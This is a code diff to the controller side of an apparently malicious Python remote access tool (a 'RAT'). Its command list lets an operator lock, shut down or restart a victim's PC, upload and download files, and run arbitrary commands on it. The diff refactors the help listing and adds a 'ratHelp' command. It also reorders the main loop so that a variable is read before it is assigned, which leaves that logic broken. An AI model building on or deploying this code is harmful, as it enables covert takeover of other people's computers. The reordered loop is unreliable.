@@ -26,7 +26,18 @@ commands = [
     ["lock", "Puts the client user back to the login screen"],
     ["shutdown", "Shutsdown the client users PC, will close connection"],
     ["restart", "Restarts the client users PC"],
+    ["ratHelp", "Shows this list again"],
 ]
+
+
+def helpCommands():
+    total = 0
+    print("Commands: ")
+    # Simple loop to send a description of all commands
+    for x in commands:
+        print(f"[{total}] {commands[total][0]} - {commands[total][1]}")
+        total += 1
+    print("[∞] Anything - will run a command on the users PC like command prompt\n")
 
 
 class Server:
@@ -42,13 +53,7 @@ class Server:
         print(colorama.Fore.GREEN)
         print("[+] Connection received from " + str(address))
         print(colorama.Style.RESET_ALL)
-        total = 0
-        print("Commands: ")
-        # Simple loop to send a description of all commands
-        for x in commands:
-            print(f"[{total}] {commands[total][0]} - {commands[total][1]}")
-            total += 1
-        print("[∞] Anything - will run a command on the users PC like command prompt\n")
+        helpCommands()
 
     def dataReceive(self):
         jsonData = b""
@@ -82,15 +87,19 @@ class Server:
     def run(self):
         while True:
             header = self.dataReceive()
-            command = input(f"{colorama.Fore.LIGHTBLUE_EX}{header}{colorama.Style.RESET_ALL}")
+            command = input(
+                f"{colorama.Fore.LIGHTBLUE_EX}{header}{colorama.Style.RESET_ALL}"
+            )
             command = command.split(" ", 1)
             try:
                 if command[0] == "upload":
                     fileContent = self.readFile(command[1]).decode()
                     command.append(fileContent)
-                result = self.executeRemotely(command)
+                if command[0] == "ratHelp":
+                    helpCommands()
                 if command[0] == "download" and "[-] Error" not in result:
                     result = self.writeFile(command[1], result)
+                result = self.executeRemotely(command)
             except Exception:
                 result = "[-] Error running command, check the syntax of the command."
             print(result)
